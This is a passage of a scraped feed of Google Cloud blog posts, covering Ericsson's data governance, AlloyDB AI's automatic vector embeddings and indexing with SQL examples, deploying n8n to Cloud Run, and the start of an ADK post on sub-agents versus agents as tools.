class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"image1\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/image1_nGFHVwm.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><ol>\n<li><strong style=\"vertical-align: baseline;\">Enterprise data architecture:</strong><span style=\"vertical-align: baseline;\"> Managing data flow, enterprise data modeling and best practices for data collection till consumption</span></li>\n<li><strong style=\"vertical-align: baseline;\">Technology and tools</strong><span style=\"vertical-align: baseline;\">: Business glossary, master, reference and metadata management, data modeling, and data quality management</span></li>\n<li><strong style=\"vertical-align: baseline;\">Roles and responsibilities:</strong><span style=\"vertical-align: baseline;\"> Roles to manage and govern data (i.e., end-to-end data lifecycle and stewardship)</span></li>\n<li><strong style=\"vertical-align: baseline;\">Data and model assurance:</strong><span style=\"vertical-align: baseline;\"> Data pipelines monitoring, data observability, and data quality monitoring</span></li>\n<li><strong style=\"vertical-align: baseline;\">Governance: </strong><span style=\"vertical-align: baseline;\">Manage data compliance, risk and security management, managing operational level agreement, objective and key results, and audit management</span></li>\n<li><strong style=\"vertical-align: baseline;\">Processes:</strong><span style=\"vertical-align: baseline;\"> Data governance, data quality, data management, and data consent related processes</span></li>\n</ol>\n<h3><strong style=\"vertical-align: baseline;\">Looking ahead: The future is integrated and intelligent</strong></h3>\n<p><span style=\"vertical-align: baseline;\">As a global technology leader, Ericsson is committed to shaping the future of AI-powered data governance. Technology, especially in the AI space, is evolving at a breathtaking pace and both the data and AI governance practices must keep up.\u00a0</span></p>\n<p><span style=\"vertical-align: baseline;\">These developments are guiding Ericsson\u2019s future priorities, which include bridging the gap between data and AI governance, especially with the rise of generative and agentic AI. These plans include evaluating using generative AI capabilities in BigQuery and Dataplex to simplify governance and pursuing solutions that ensure transparency, explainability, fairness and manage risk in the deployment of AI models.\u00a0</span></p>\n<p><span style=\"vertical-align: baseline;\">In addition to harnessing the power of AI for at-scale governance, Ericsson will also include usage of governance workflows, glossary-driven data quality policies, at-scale assignment of terms to assets, bulk import and export of glossaries, AI-powered glossary recommendations, and data quality re-usability functionalities. Ericsson is also aligning its architecture with data fabric and data mesh principles, empowering teams with self-service access to high-quality, trusted data products.</span><span style=\"vertical-align: baseline;\">Finally, Ericsson will be assessing the use of more granular, policy-based access controls to complement existing role-based access, further strengthening its data security, protection and privacy.</span></p>\n<p><span style=\"vertical-align: baseline;\">For any organization embarking on a similar path, Ericsson\u2019s experience offers several key lessons:</span></p>\n<ol>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Governance is a value enabler, not a blocker:</strong><span style=\"vertical-align: baseline;\"> A modern data governance program is focused on business enablement first, driving value and innovation, to complement policies, rules and risk management.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">It's a journey, not a destination:</strong><span style=\"vertical-align: baseline;\"> Be prepared to fail fast, learn, and adapt. The landscape is constantly changing at breakneck speed.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Focus on business outcomes, not tools:</strong><span style=\"vertical-align: baseline;\"> Technology is a critical enabler, but the conversation is about the business value you\u2019re creating. Simplify the story, speak the language of the business, and unpack the hype.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Culture is everything:</strong><span style=\"vertical-align: baseline;\"> For governance to be effective, it\u2019s the responsibility of everyone. This requires strong leadership, sponsorship, and a \"data-first\" mindset embedded throughout the organization.</span></p>\n</li>\n</ol>\n<p><span style=\"vertical-align: baseline;\">By partnering with Google Cloud and tapping into the power of Dataplex Universal Catalog, Ericsson is building a data foundation that is not only compliant and secure but agile and intelligent \u2014 ready to power the next generation of autonomous networks.</span></p></div>",
        "published_date": "2025-11-07 17:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/products/databases/alloydb-ai-auto-vector-embeddings-and-auto-vector-index/",
        "title": "AlloyDB accelerates AI with automated vector indexing and embedding",
        "thumbnail": null,
        "author": "Alan Li",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Modern applications store their most valuable data such as product catalogs or user profiles in operational databases. These data stores are excellent for applications that need to handle real-time transactions \u2014 and with their support for vector operations, they\u2019ve also become an excellent foundation for modern search or gen AI application serving.</span></p>\n<p><a href=\"https://cloud.google.com/alloydb/ai\"><span style=\"text-decoration: underline; vertical-align: baseline;\">AlloyDB AI</span></a><span style=\"vertical-align: baseline;\"> provides powerful, high-performance vector capabilities enabling you to generate embeddings inline and manually </span><a href=\"https://docs.cloud.google.com/alloydb/docs/ai/best-practices-tuning-scann\"><span style=\"text-decoration: underline; vertical-align: baseline;\">tune powerful vector indexes</span></a><span style=\"vertical-align: baseline;\">. While you can generate embeddings out of the box for in line search use cases, we also wanted AlloyDB to address the complexity of creating and maintaining huge numbers of vector embeddings.\u00a0</span></p>\n<p><span style=\"vertical-align: baseline;\">To make this possible, we\u2019re introducing two new features for AlloyDB AI, available in preview, that will empower you to transform your existing operational database into a powerful, AI-native database with just a few lines of SQL:</span></p>\n<ol>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Auto vector embeddings</strong></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Auto vector index</strong></p>\n</li>\n</ol>\n<p><a href=\"https://cloud.google.com/alloydb/docs/ai/generate-manage-auto-embeddings-for-tables\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Auto vector embeddings</span></a><span style=\"vertical-align: baseline;\"> transform operational data into vector search ready data by vectorizing data stored inside of AlloyDB at scale. The </span><a href=\"https://docs.cloud.google.com/alloydb/docs/ai/create-scann-index#create-scann-index-automatic\"><span style=\"text-decoration: underline; vertical-align: baseline;\">auto vector index</span></a><span style=\"vertical-align: baseline;\"> self-configures vector indexes optimized for customer\u2019s workloads, ensuring high quality and performance.</span></p>\n<p><span style=\"vertical-align: baseline;\">Compare this to the traditional approach of creating the vectors and loading them into your database. The basic steps are familiar to any AI developer: generate vector embeddings using specialized AI models, import the vectors into the database alongside the underlying text, and tune vector indexes. In other words, build an ETL (Extract, Transform, Load) pipeline, extract the data from your database, apply transformations, run it through the AI model, reload and reformat it, then reinsert it into your database and then tune the vector indexes. This approach not only involves significant engineering complexity but also introduces latency, making it difficult to keep your application in sync with your live data despite it being stored alongside it.</span></p>\n<p><span style=\"vertical-align: baseline;\">An additional challenge is to keep the vector index up to date, which is hard to do manually. While manually tuned indexes are performant and provide excellent results, they can be sensitive to updates in the underlying data and require performance and quality testing before they\u2019re ready to hit the road.</span></p>\n<p><span style=\"vertical-align: baseline;\">Let's walk through an example journey of an operational workload and see how AlloyDB AI\u2019s new features remove friction from building enterprise-grade AI, and enable users to modernize applications from their database.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">AlloyDB as a vector database</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Imagine you run a large e-commerce platform with a </span><code style=\"vertical-align: baseline;\">products</code><span style=\"vertical-align: baseline;\"> table in AlloyDB, containing structured data like </span><code style=\"vertical-align: baseline;\">product_id</code><span style=\"vertical-align: baseline;\">, </span><code style=\"vertical-align: baseline;\">color</code><span style=\"vertical-align: baseline;\">, </span><code style=\"vertical-align: baseline;\">price</code><span style=\"vertical-align: baseline;\">, and </span><code style=\"vertical-align: baseline;\">inventory_count</code><span style=\"vertical-align: baseline;\">, alongside unstructured data such as </span><code style=\"vertical-align: baseline;\">product_description</code><span style=\"vertical-align: baseline;\">.</span></p>\n<p><span style=\"vertical-align: baseline;\">You want to build a gen AI search feature to improve the quality of search in your application and make it more dynamic and personalized for users. You want to evolve from solely supporting simple lexical searches such as\u00a0 \"jacket\", which perform exact matches, to searches such as \"warm coat for winter\" that can find semantically similar items like jackets, coats or vests. To refine the quality, you also want to combine this semantic matching with structured filters such as </span><code style=\"vertical-align: baseline;\">color = 'maroon'</code><span style=\"vertical-align: baseline;\"> or </span><code style=\"vertical-align: baseline;\">price &lt; 100</code><span style=\"vertical-align: baseline;\">. Some of these filters may even live in a different table, such as an orders table which stores information about the user's order history.</span></p></div>\n<div class=\"block-aside\"><dl>\n    <dt>aside_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;title&#x27;, &#x27;Get started with a 30-day AlloyDB free trial instance&#x27;), (&#x27;body&#x27;, &lt;wagtail.rich_text.RichText object at 0x7f9174658160&gt;), (&#x27;btn_text&#x27;, &#x27;&#x27;), (&#x27;href&#x27;, &#x27;&#x27;), (&#x27;image&#x27;, None)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph_advanced\"><h3><strong style=\"vertical-align: baseline;\">From operational to AI-native</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Before you can get started on application logic, you need to generate embeddings on your data so you can perform a vector search. For this you would typically need to:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Build an ETL pipeline to extract </span><code style=\"vertical-align: baseline;\">products</code><span style=\"vertical-align: baseline;\"> data from AlloyDB</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Write custom code to batch the data and send it to an embedding model API on Vertex AI</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Carefully manage rate limits, token limits, and failures</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Write the resulting vectors </span><span style=\"font-style: italic; vertical-align: baseline;\">back</span><span style=\"vertical-align: baseline;\"> into your database</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Build </span><span style=\"font-style: italic; vertical-align: baseline;\">another</span><span style=\"vertical-align: baseline;\"> process to watch for </span><code style=\"vertical-align: baseline;\">UPDATE</code><span style=\"vertical-align: baseline;\"> commands so you can do it again and again, just to keep your data fresh</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">AlloyDB AI\u2019s new feature, auto vector embeddings, eliminates this entire workflow.</span></p>\n<p><span style=\"vertical-align: baseline;\">It provides a fully managed, scalable solution to create and maintain embeddings </span><span style=\"font-style: italic; vertical-align: baseline;\">directly from the database</span><span style=\"vertical-align: baseline;\">. The system batches API calls to Vertex AI, maximizing throughput, and can operate as a background process to ensure that your critical transactions aren't blocked.</span></p>\n<p><span style=\"vertical-align: baseline;\">To generate vector embeddings from your </span><code style=\"vertical-align: baseline;\">product_description</code><span style=\"vertical-align: baseline;\"> column, you just run one SQL command:</span></p></div>\n<div class=\"block-code\"><dl>\n    <dt>code_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;code&#x27;, &quot;CALL ai.initialize_embeddings(\\r\\n    model_id =&gt; &#x27;gemini-embedding-001&#x27;,\\r\\n    table_name =&gt; &#x27;products&#x27;,\\r\\n    content_column =&gt; &#x27;product_description&#x27;,\\r\\n    embedding_column =&gt; &#x27;product_embedding&#x27;,\\r\\n    incremental_refresh_mode =&gt; &#x27;transactional&#x27;  -- Automatically updates on data changes\\r\\n);&quot;), (&#x27;language&#x27;, &#x27;&#x27;), (&#x27;caption&#x27;, &lt;wagtail.rich_text.RichText object at 0x7f91746585e0&gt;)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Now AlloyDB can handle embedding generation for you. Your </span><code style=\"vertical-align: baseline;\">products</code><span style=\"vertical-align: baseline;\"> table is AI-enabled and\u00a0 embeddings are automatically updated as your data changes.\u00a0</span></p>\n<p><span style=\"vertical-align: baseline;\">If you prefer to manually refresh embeddings, you can run the following SQL command: </span></p></div>\n<div class=\"block-code\"><dl>\n    <dt>code_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;code&#x27;, &quot;CALL ai.refresh_embeddings(\\r\\n    table_name =&gt; &#x27;products&#x27;,\\r\\n    embedding_column =&gt; &#x27;product_embedding&#x27;,          -- embedding vector column\\r\\n    batch_size =&gt; 50                                  -- optional override\\r\\n);&quot;), (&#x27;language&#x27;, &#x27;&#x27;), (&#x27;caption&#x27;, &lt;wagtail.rich_text.RichText object at 0x7f9174658520&gt;)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph_advanced\"><h3><strong style=\"vertical-align: baseline;\">Turbocharging search with AlloyDB AI\u00a0</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Now that you have embeddings, you face the second hurdle: performance and quality of search. Say a user searches for \"warm winter coat.\" Your query may look like this:</span></p></div>\n<div class=\"block-code\"><dl>\n    <dt>code_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;code&#x27;, &quot;SELECT * FROM products\\r\\nWHERE color = &#x27;maroon&#x27;\\r\\nORDER BY product_embedding &lt;-&gt; google_ml.embedding(&#x27;gemini-embedding-001&#x27;, &#x27;warm coat for winter&#x27;)\\r\\nLIMIT 10;&quot;), (&#x27;language&#x27;, &#x27;&#x27;), (&#x27;caption&#x27;, &lt;wagtail.rich_text.RichText object at 0x7f9174658340&gt;)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">To make this vector search query performant, you need a vector index. But traditional vector indexes require deep expertise: you have to manually configure parameters, rebuild the index periodically as data changes, and hope your tuning is correct. This complexity slows development and adds operational complexity.</span></p></div>\n<div class=\"block-code\"><dl>\n    <dt>code_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;code&#x27;, &#x27;-- Optimal `num_leaves` and `max_num_levels` are based on number of vectors in the\\r\\n-- products table, which means the user will have to figure that out beforehand to\\r\\n-- properly tune the index.\\r\\n\\r\\nCREATE INDEX idx_products_embedding ON products\\r\\nUSING scann (product_embedding)\\r\\nWITH (num_leaves=100000, max_num_levels=2);&#x27;), (&#x27;language&#x27;, &#x27;&#x27;), (&#x27;caption&#x27;, &lt;wagtail.rich_text.RichText object at 0x7f9174658310&gt;)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">The new auto vector index feature abstracts all this away and delivers a fully automated and integrated vector search experience that is self-configuring, self-maintaining, and self-tuning. To create a fully optimized index, you just run:</span></p></div>\n<div class=\"block-code\"><dl>\n    <dt>code_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;code&#x27;, &quot;-- AlloyDB will automatically figure out index configuration underneath the hood.\\r\\nCREATE INDEX idx_products_embedding ON products\\r\\nUSING scann (product_embedding)\\r\\nWITH (mode = &#x27;AUTO&#x27;);&quot;), (&#x27;language&#x27;, &#x27;&#x27;), (&#x27;caption&#x27;, &lt;wagtail.rich_text.RichText object at 0x7f9174658490&gt;)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">With mode='AUTO', AlloyDB handles everything:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Automatic configuration:</strong><span style=\"vertical-align: baseline;\"> It analyzes your data and automatically configures the index parameters at creation time to meet your performance and quality goals.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Automatic maintenance:</strong><span style=\"vertical-align: baseline;\"> The index updates incrementally and automatically as your data changes, ensuring it remains optimized without any manual intervention. It automatically splits as the index grows in size and automatically updates centroids when data distribution drifts.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Automatic query plan optimization:</strong><span style=\"vertical-align: baseline;\"> This is where the real magic happens. The ScaNN index leverages real-time workload statistics to self-tune and optimize te execution plan. For a deeper dive, read our previous blog, </span><a href=\"https://cloud.google.com/blog/products/databases/alloydb-ais-scann-index-improves-search-on-all-kinds-of-data\"><span style=\"text-decoration: underline; vertical-align: baseline;\">A deep dive into AlloyDB\u2019s vector search enhancements</span></a><span style=\"vertical-align: baseline;\">.</span></p>\n</li>\n</ul>\n<h3><strong style=\"vertical-align: baseline;\">Two new ways to become AI-native</strong></h3>\n<p><span style=\"vertical-align: baseline;\">With AlloyDB\u2019s new capabilities, making your operational workload AI-native no longer requires complex ETL pipelines and infrastructure code.</span></p>\n<ol>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Auto vector embeddings transforms your data by handling the entire embedding generation and management lifecycle inside the database.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Auto vector index simplifies retrieval by providing a self-tuning, self-maintaining index that automatically optimizes complex filtered vector searches.</span></p>\n</li>\n</ol>\n<p><span style=\"vertical-align: baseline;\">By removing this complexity, AlloyDB empowers you to use your existing SQL skills to build and scale world-class AI experiences with speed and confidence, moving projects from proof-of-concept to production faster than ever before. Get started with </span><a href=\"https://cloud.google.com/alloydb/docs/ai/generate-manage-auto-embeddings-for-tables\"><span style=\"text-decoration: underline; vertical-align: baseline;\">auto vector embeddings</span></a><span style=\"vertical-align: baseline;\"> and the </span><a href=\"https://docs.cloud.google.com/alloydb/docs/ai/create-scann-index#create-scann-index-automatic\"><span style=\"text-decoration: underline; vertical-align: baseline;\">auto vector index</span></a><span style=\"vertical-align: baseline;\"> today.</span></p>\n<p><span style=\"vertical-align: baseline;\">To get started, try our</span><a href=\"https://www.google.com/search?q=https://cloud.google.com/alloydb/docs/free-trial\"><span style=\"text-decoration: underline; vertical-align: baseline;\"> 30-day AlloyDB free trial</span></a><span style=\"vertical-align: baseline;\">. New Google Cloud customers also get $300 in free credits.</span></p></div>",
        "published_date": "2025-11-07 17:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/topics/developers-practitioners/deploy-n8n-on-cloud-run/",
        "title": "Easy AI workflow automation: Deploy n8n on Cloud Run",
        "thumbnail": "https://storage.googleapis.com/gweb-cloudblog-publish/images/hero_live.max-600x600.png",
        "author": "Ryan Pei",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><a href=\"https://n8n.io/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">n8n</span></a><span style=\"vertical-align: baseline;\"> is a powerful yet easy-to-use workflow and automation tool for multi-step AI agents, and many teams want a simple, scalable, and cost-effective way to self-host it. With just a few commands, you can deploy n8n to Cloud Run and have it up and running, ready to supercharge your business with AI workflows that can manage spreadsheets, read and draft emails, and more. The </span><a href=\"https://docs.n8n.io/hosting/installation/server-setups/google-cloud-run\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">n8n docs</span></a><span style=\"vertical-align: baseline;\"> now tell you how to deploy the official n8n Docker image to our serverless platform, connect it to Cloud SQL for persistent data storage, call Gemini as the agents\u2019 LLM, and (optionally) connect your workflows directly to Google Workspace.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Deploy n8n to Cloud Run in minutes</strong></h3>\n<p><span style=\"vertical-align: baseline;\">You can deploy the official n8n image directly to Cloud Run. This gives you a managed, serverless environment that automatically scales from zero to handle any workload, so you only pay for what you use. That means whenever you\u2019re not actively using n8n, you\u2019re not paying for any compute and your n8n data is persisted in Cloud SQL.</span></p>\n<p><span style=\"vertical-align: baseline;\">To first try out n8n quickly on Cloud Run, deploy it with this one command:</span></p></div>\n<div class=\"block-code\"><dl>\n    <dt>code_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;code&#x27;, &#x27;gcloud run deploy --image=n8nio/n8n \\\\\\r\\n    --allow-unauthenticated \\\\\\r\\n    --port=5678 \\\\\\r\\n    --no-cpu-throttling \\\\\\r\\n    --memory=2Gi&#x27;), (&#x27;language&#x27;, &#x27;&#x27;), (&#x27;caption&#x27;, &lt;wagtail.rich_text.RichText object at 0x7f917463ab20&gt;)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">This gives you a running instance of n8n that you can use to try out n8n and all its awesome features for workflow automation with the power of AI. Connect your first n8n agent to Gemini (provide your Gemini API key for the \u201cGoogle Gemini Chat Model\u201d credentials) and see it in action.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"1 - basic n8n setup\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/1_-_basic_n8n_setup.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Then when you\u2019re ready to use n8n for actual workflows, you can follow the steps in the </span><a href=\"https://docs.n8n.io/hosting/installation/server-setups/google-cloud-run/#durable-mode\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">n8n docs</span></a><span style=\"vertical-align: baseline;\"> for a more durable, secure setup (using Cloud SQL, Secrets Manager, etc.). You can either use a Terraform script or follow along step-by-step through each gcloud command in the instructions.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Connect Google Workspace tools</strong></h3>\n<p><span style=\"vertical-align: baseline;\">A key benefit of hosting on Google Cloud is the ability to easily connect n8n to your Google Workspace tools. The </span><a href=\"https://docs.n8n.io/hosting/installation/server-setups/google-cloud-run/#optional-enabling-google-workspace-services-as-n8n-tools\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">n8n docs</span></a><span style=\"vertical-align: baseline;\"> walk you through the steps to configure OAuth for Google Cloud, allowing your n8n workflows to securely access and automate tasks using Google tools like Gmail, Google Calendar, and Google Drive.</span></p>\n<p><span style=\"vertical-align: baseline;\">Here\u2019s a demo showing an n8n instance on Cloud Run that uses Gmail and Google Calendar to schedule appointments on your behalf whenever an email hits your inbox with a request to meet:</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"2 - google workspace n8n\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/original_images/2_-_google_workspace_n8n.gif\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">The two AI agents in this n8n workflow call Gemini to do the following:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">The </span><strong style=\"vertical-align: baseline;\">Text Classifier</strong><span style=\"vertical-align: baseline;\"> reads your incoming emails to see which ones are asking for time to meet</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">The </span><strong style=\"vertical-align: baseline;\">Agent</strong><span style=\"vertical-align: baseline;\"> checks your calendar for your availability, and sends a response with a suggested time</span></p>\n</li>\n</ul>\n<h3><strong style=\"vertical-align: baseline;\">Cloud Run is great for all AI apps</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Cloud Run is a versatile, easy-to-use runtime for all your AI application needs. Whether your agentic app was made with n8n, </span><a href=\"https://cloud.google.com/blog/products/ai-machine-learning/deploy-langchain-on-cloud-run-with-langserve\"><span style=\"text-decoration: underline; vertical-align: baseline;\">LangChain</span></a><span style=\"vertical-align: baseline;\">, </span><a href=\"https://google.github.io/adk-docs/deploy/cloud-run/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">ADK</span></a><span style=\"vertical-align: baseline;\">, or no framework at all, you can deploy it to Cloud Run. This collaboration on Cloud Run and n8n is another example of how we aim to simplify the process for developers to build and deploy intelligent applications.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Next steps</strong></h3>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Read more about </span><a href=\"https://cloud.run/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Cloud Run</span></a><span style=\"vertical-align: baseline;\"> (or just </span><a href=\"https://console.cloud.google.com/run\"><span style=\"text-decoration: underline; vertical-align: baseline;\">try it out in the web console</span></a><span style=\"vertical-align: baseline;\">!)</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Explore </span><a href=\"https://n8n.io/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">n8n</span></a></p>\n</li>\n</ul></div>",
        "published_date": "2025-11-07 17:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/topics/developers-practitioners/where-to-use-sub-agents-versus-agents-as-tools/",
        "title": "ADK architecture: When to use sub-agents versus agents as tools",
        "thumbnail": null,
        "author": "Dharini Chandrashekhar",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">At its simplest, an agent </span><span style=\"vertical-align: baseline;\">is an application that reasons on how to best achieve a goal based on inputs and tools at its disposal.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"image1\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/image1_oGjJbVH.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">As you build sophisticated multi-agent AI systems with the Agent Development Kit (ADK), a key architectural decision involves choosing between a sub-agent and an agent as a tool. This choice fundamentally impacts your system's design, how well it scales, and its efficiency. Choosing the wrong pattern can lead to massive overhead \u2014 either by constantly passing full conversational history to a simple function or by under-utilizing the context-sharing capabilities of a more complex system.</span></p>\n<p><span style=\"vertical-align: baseline;\">While both sub-agents and tools help break down complex problems, they serve different purposes. The key difference is how they handle </span><strong style=\"vertical-align: baseline;\">control</strong><span style=\"vertical-align: baseline;\"> and </span><strong style=\"vertical-align: baseline;\">context</strong><span style=\"vertical-align: baseline;\">.\u00a0</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Agents as tools: The specialist on call</strong></h3>\n<p><span style=\"vertical-align: baseline;\">An agent as a tool is a self-contained expert agent packaged for a </span><strong style=\"vertical-align: baseline;\">specific, discrete task</strong><span style=\"vertical-align: baseline;\">, like a specialized function call. The main agent calls the tool with a clear input and gets a direct output, operating like a transactional API. The main agent doesn't need to worry about </span><span style=\"font-style: italic; vertical-align: baseline;\">how</span><span style=\"vertical-align: baseline;\"> the tool works; it only needs a reliable result. This pattern is ideal for independent and reusable tasks.</span></p>\n<p><strong style=\"vertical-align: baseline;\">Key characteristics:</strong></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Encapsulated and reusable:</strong><span style=\"vertical-align: baseline;\"> The internal logic is hidden, making the tool easy to reuse across different agents.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Isolated context:</strong><span style=\"vertical-align: baseline;\"> The tool runs in its own session and cannot access the calling agent\u2019s conversation history or state.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Stateless:</strong><span style=\"vertical-align: baseline;\"> The interaction is stateless. The tool receives all the information it needs in a single request.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Strict input/output:</strong><span style=\"vertical-align: baseline;\"> It operates based on a well-defined contract.</span></p>\n</li>\n</ul>\n<h3><strong style=\"vertical-align: baseline;\">Sub-agents: The delegated team member</strong></h3>\n<p><span style=\"vertical-align: baseline;\">A sub-agent is a </span><strong style=\"vertical-align: baseline;\">delegated team member</strong><span style=\"vertical-align: baseline;\"> that handles a complex, multi-step process. This is a hierarchical and collaborative relationship where the sub-agent works within the </span><strong style=\"vertical-align: baseline;\">broader context</strong><span style=\"vertical-align: baseline;\"> of the parent agent's mission. Use sub-agents for tasks that require a chain of reasoning or a series of interactions.</span></p>\n<p><strong style=\"vertical-align: baseline;\">Key characteristics:</strong></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Tightly coupled and integrated:</strong><span style=\"vertical-align: baseline;\"> Sub-agents are part of a larger, defined workflow. </span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Shared context:</strong><span style=\"vertical-align: baseline;\"> They operate within the same session and can access the parent's conversation history and state, allowing for more nuanced collaboration.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Stateful processes:</strong><span style=\"vertical-align: baseline;\"> They are ideal for managing processes where the task requires several steps to complete. </span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: 